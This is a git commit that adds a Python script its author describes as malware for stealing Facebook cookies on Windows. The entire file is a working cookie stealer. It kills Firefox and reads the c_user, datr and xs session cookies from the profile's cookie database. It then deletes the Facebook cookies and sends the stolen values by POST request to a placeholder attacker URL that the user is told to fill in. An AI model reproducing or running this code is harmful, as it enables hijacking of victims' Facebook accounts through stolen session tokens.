6e3cdd1e347b087a319be4a2bb191e704fae2ae2
rash2kool <rashid.2008feroz@gmail.com>
2015-01-31 13:14:28 +0530

    Facebook cookie stealer code for windows
    A small piece of malware to steal facebook cookies from firefox's cookie
    database.

---
+++ win_cookie_stealer.py
@@ -0,0 +1,81 @@
+import os
+import psutil
+import sqlite3
+import urllib
+import urllib2
+
+#kill firefox
+PROCNAME = "firefox.exe"
+ 
+def kill_firefox():
+    for proc in psutil.process_iter():
+        try:
+            if proc.name() == PROCNAME:
+                proc.kill()
+        except:
+            pass
+kill_firefox()
+
+
+#get cookie DB pathname
+s1=os.getenv('APPDATA')
+s2="\\Mozilla\\Firefox\\Profiles\\"
+
+moz_profile_folder_name = os.listdir(s1+s2)
+
+for name in moz_profile_folder_name:
+    n=name
+s=s1+s2+n+"\cookies.sqlite"
+
+
+#Extract Cookie details from DB
+c_user=datr=xs="None"
+sqlite_file = s
+conn = sqlite3.connect(sqlite_file)
+c = conn.cursor()
+
+c.execute("select count(*) from moz_cookies where baseDomain='facebook.com' and name='c_user'")
+
+for data in c.fetchall():
+    count=data[0]
+
+if(count == 1):
+    
+    c.execute("select value from moz_cookies where baseDomain='facebook.com' and name='c_user'")
+
+    for data in c.fetchall():
+        c_user=data[0]
+
+    c.execute("select value from moz_cookies where baseDomain='facebook.com' and name='datr'")
+
+    for data in c.fetchall():
+        datr=data[0]
+
+    c.execute("select value from moz_cookies where baseDomain='facebook.com' and name='xs'")
+
+    for data in c.fetchall():
+        xs=data[0]
+
+
+    #Delete facebook cookies from DB
+    c.execute("delete from moz_cookies where baseDomain='facebook.com'")
+
+conn.commit()
+
+conn.close()
+
+xs=str(xs)
+
+#sending the cookie data to the attacker using POST request.
+#enter your webhost here in the url field.
+
+url = 'http://your-website.com/cookie_logger.php'
+payload = {'c_user': c_user, 'datr': datr,'xs': xs}
+
+if (xs != "None"):
+    data = urllib.urlencode(payload)
+    req = urllib2.Request(url, data)
+    response = urllib2.urlopen(req)
+
+
+
